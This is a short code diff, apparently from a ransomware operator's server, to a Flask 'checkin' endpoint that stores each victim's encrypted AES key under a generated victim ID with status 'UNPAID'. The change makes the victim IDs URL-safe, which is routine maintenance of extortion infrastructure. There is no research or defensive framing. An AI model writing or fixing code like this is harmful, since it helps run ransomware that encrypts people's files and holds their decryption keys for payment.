@@ -158,7 +158,8 @@ def checkin():
     if not encrypted_aes_key_b64:
         return jsonify({"error": "Missing key"}), 400
 
-    victim_id = base64.b64encode(os.urandom(8)).decode('utf-8')
+    # Use URL-safe base64 to prevent routing issues with '/' characters
+    victim_id = base64.urlsafe_b64encode(os.urandom(8)).decode('utf-8').rstrip('=')
     victims[victim_id] = {
         "status": "UNPAID",
         "encrypted_key": encrypted_aes_key_b64,
